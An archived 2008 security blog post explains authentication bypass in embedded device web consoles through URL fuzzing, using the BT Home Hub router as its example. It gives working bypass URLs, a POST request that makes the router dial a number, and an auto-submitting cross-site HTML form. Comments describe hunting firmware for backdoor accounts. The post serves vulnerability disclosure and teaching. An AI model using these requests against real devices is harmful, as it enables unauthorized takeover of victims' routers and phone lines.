<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Holes In Embedded Devices Authentication Bypass (pt 1)</title><meta name="description" content="Finding authentication bypass bugs is an obvious choice for attackers, since such bugs allow administrative changes to be made without knowledge of the admin password. In other words, compromising the target device without requiring a password is of course something attackers are interested in! You bet!"><meta property="name" content="Holes In Embedded Devices Authentication Bypass (pt 1)"><meta itemprop="name" content="Holes In Embedded Devices Authentication Bypass (pt 1)"><meta property="description" content="Finding authentication bypass bugs is an obvious choice for attackers, since such bugs allow administrative changes to be made without knowledge of the admin password. In other words, compromising the target device without requiring a password is of course something attackers are interested in! You bet!"><meta itemprop="description" content="Finding authentication bypass bugs is an obvious choice for attackers, since such bugs allow administrative changes to be made without knowledge of the admin password. In other words, compromising the target device without requiring a password is of course something attackers are interested in! You bet!"><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fholes-in-embedded-devices-authentication-bypass-pt-1%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fholes-in-embedded-devices-authentication-bypass-pt-1%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/holes-in-embedded-devices-authentication-bypass-pt-1/"><meta property="og:title" content="Holes In Embedded Devices Authentication Bypass (pt 1)"><meta property="og:description" content="Finding authentication bypass bugs is an obvious choice for attackers, since such bugs allow administrative changes to be made without knowledge of the admin password. In other words, compromising the target device without requiring a password is of course something attackers are interested in! You bet!"><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fholes-in-embedded-devices-authentication-bypass-pt-1%2F?w=1024"><meta name="twitter:title" content="Holes In Embedded Devices Authentication Bypass (pt 1)"><meta name="twitter:description" content="Finding authentication bypass bugs is an obvious choice for attackers, since such bugs allow administrative changes to be made without knowledge of the admin password. In other words, compromising the target device without requiring a password is of course something attackers are interested in! You bet!"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fholes-in-embedded-devices-authentication-bypass-pt-1%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Holes In Embedded Devices Authentication Bypass (pt 1)</h1><div class="date">Thu, 14 Feb 2008 12:13:33 GMT</div><div class="author">by
pagvac</div><div id="post-content"><p>Finding authentication bypass bugs is an obvious choice for attackers, since such bugs allow administrative changes to be made without knowledge of the admin password. In other words, compromising the target device without requiring a password is of course something attackers are interested in! You bet!</p>
<p>After performing my own research and going through authentication bypass bugs on embedded devices published by other peers in the community, I came to the conclusion that these bugs are usually (or at least quite often) very simple flaws in web interfaces. Once you find one of these bugs they are usually trivial to exploit, and remind you of web vulnerabilities that you would expect finding in the 90s, but not these days.</p>
<p>The fact that embedded devices are very primitive in terms of hardware, ultimately means that the security of the software running on them is also sacrificed. Most of the authentication bypass bugs found on web interfaces of embedded devices fall into one of the following categories:</p>
<ul>
<li>URL fuzzing a.k.a. additional representation of URLs</li>
<li>A-to-C attacks a.k.a. knowledge of &quot;post-authentication&quot; URLs</li>
<li>Unchecked HTTP methods</li>
<li>Unchecked administrative HTTP requests aka unprotected cgi scripts</li>
<li>Unprotected redirects</li>
</ul>
<p>We will go through all these authentication bypass bugs in detail. For this post, we will only cover the first type: URL fuzzing a.k.a. additional representation of URLs&lt;.</p>
<h2 id="authentication-bypass-via-url-fuzzing">Authentication bypass via URL fuzzing</h2>
<p>URL fuzzing targets bugs in the web server or server-side scripts that are part of the web console of an embedded device. These bugs could be due to a poorly-written regex, and finding them is all about finding alternative ways to represent a URL that would usually grant access to administrative functionalities. Sometimes, there are multiple ways a URL can be represented which is still understood by the target device, but causes the device to not require the user to enter a password.</p>
<p>For instance, the BT Home Hub, which is the most popular DSL router in the UK is <a href="/blog/bt-home-flub-pwnin-the-bt-home-hub-4">vulnerable</a> to an authentication bypass bug due to the device accepting multiple representations of the same URL as valid, but only checking for password when submitting URLs in their original form. For example, the URL for accessing the firewall settings looks like: <code>http://bthomehub/cgi/b/secpol/cfg/</code> or <code>http://bthomehub/cgi/b/secpol/cfg/?ce=1&amp;be=1&amp;l0=4&amp;l1=7</code> (they&#39;re both equivalent). However, appending various characters after the directory path allows attackers to completely bypass the authentication prompt:</p>
<ul>
<li><a href="http://bthomehub/cgi/b/secpol/cfg/%5C">http://bthomehub/cgi/b/secpol/cfg/%5C</a></li>
<li><a href="http://bthomehub/cgi/b/secpol/cfg//">http://bthomehub/cgi/b/secpol/cfg//</a></li>
<li><a href="http://bthomehub/cgi/b/secpol/cfg/%">http://bthomehub/cgi/b/secpol/cfg/%</a></li>
<li><a href="http://bthomehub/cgi/b/secpol/cfg/">http://bthomehub/cgi/b/secpol/cfg/</a>~</li>
</ul>
<p>...and so on. The same technique could be used in this case not only to retrieve administrative settings, but also to make administrative changes. The only difference is that the requests must be submitted as POST rather than GET, but we still append the special characters to the URL the POST request is submitted to.For instance, the following POST request causes the BT Home Hub to call the Internet Office of the Holy See. Notice the double slash in the POST URL:</p>
<pre><code class="language-http"><span class="keyword">POST</span> <span class="string">/cgi/b/_voip_/stats//?ce=1&amp;be=0&amp;l0=-1&amp;l1=-1&amp;name=</span> HTTP/1.1
<span class="attribute">Host</span>: bthomehub

<span class="angelscript"><span class="number">0</span>=<span class="number">30</span>&amp;<span class="number">1</span>=<span class="number">00390669893461</span></span></code></pre>
<p>Such requests could be submitted by the victim&#39;s web browser via a HTML form with a <code>method=&quot;POST&quot;</code> attribute:</p>
<pre><code class="language-html"><span class="tag">&lt;<span class="name">html</span>&gt;</span>
<span class="tag">&lt;<span class="name">body</span>&gt;</span>
<span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"form"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"application/x-www-form-urlencoded"</span> <span class="attr">action</span>=<span class="string">"http://bthomehub/cgi/b/_voip_/stats//?ce=1&amp;be=0&amp;l0=-1&amp;l1=-1&amp;name="</span>&gt;</span>
<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"0"</span> <span class="attr">value</span>=<span class="string">"30"</span>/&gt;</span>
<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"1"</span> <span class="attr">value</span>=<span class="string">"00390669893461"</span>/&gt;</span>
<span class="tag">&lt;/<span class="name">form</span>&gt;</span>
<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">form.submit()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>
<span class="tag">&lt;/<span class="name">body</span>&gt;</span>
<span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre>
</div><div id="post-comments"><p><em>Archived Comments</em></p><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5df87b40193ad4365f6399456f16dd5e?s=256&amp;d=retro" alt="nexact"><span class="post-comment-author">nexact</span><div class="post-comment-content">hey pdp!

did I gave you some idea with my auth bypass for airspan prost antenna ? heheh ;)

good posts. ;-)

btw.. if your able to put your hand on a device with port 23 open and you have the firmware.. disassemble it, check if you can't find a default login/passwd account in it.. i made a found during a pentest, apc battery had a backdoor account.. I've been able to go in debug mode and dump the eeprom then gain access to web interface. gg. :)

i know theres a couple of websites around there that giving out default password but you can be *really* surprised if u take a look by yourself.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5df87b40193ad4365f6399456f16dd5e?s=256&amp;d=retro" alt="nexact"><span class="post-comment-author">nexact</span><div class="post-comment-content">s/pdp/ap/ in the last comments</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&amp;d=retro" alt="Adrian Pastor"><span class="post-comment-author">Adrian Pastor</span><div class="post-comment-content">hey nexact, thanks for your feedback! just for the record the BT Home Hub auth bypass mentioned as an example was published in Oct 2007 (http://www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub) and found a month before that. 

Needless to say, URL fuzzying is nothing new. The point of this post series is to show that embedded devices can be susceptible to *very* trivial auth bypass bugs.

You're so right, that we shouldn't just rely on documented default accounts when trying to find a valid username/password combination. Reverse-engineering the firmware is definitely the way forward!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&amp;d=retro" alt="ap"><span class="post-comment-author">ap</span><div class="post-comment-content">correction: "that we shouldn't just rely" -&gt; "we shouldn't just rely"</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/4236928e0739f6875dc108729a1e12be?s=256&amp;d=retro" alt="NurBo"><span class="post-comment-author">NurBo</span><div class="post-comment-content">good shez Adrian Pastor keep it up I like all 3 parts!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/d8582ad45d02151e2f22560a64036336?s=256&amp;d=retro" alt="joephantom"><span class="post-comment-author">joephantom</span><div class="post-comment-content">nice photo. differential equations and gauss's divergence are your best friends.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/beb21939f6a5a1e3b48faa2d5eed358a?s=256&amp;d=retro" alt="spenser"><span class="post-comment-author">spenser</span><div class="post-comment-content">Never mind a ups.

There is a $30K+ "enterprise unified threat management" appliance that seems to have a hard coded backdoor super admin account that is not documented to purchasers. It certainly is not mentioned in the documentation. But, it can be seen plain as day to anyone looking at the firmware.

As a matter of fact, in recent years, the newsgroups are rife with complaints from admins that the first thing support wants when called is to be granted admin access from outside the perimeter. Naturally, due to the fact that firewall admins are likely to be somewhat aware of security, this tendency has raised a great deal of derision. The existence of a secret "super admin" account would certainly explain the desire of first level support techs to gain permission to logon.</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2024 <a href=""></a>. All rights reserved.</p></footer></body></html>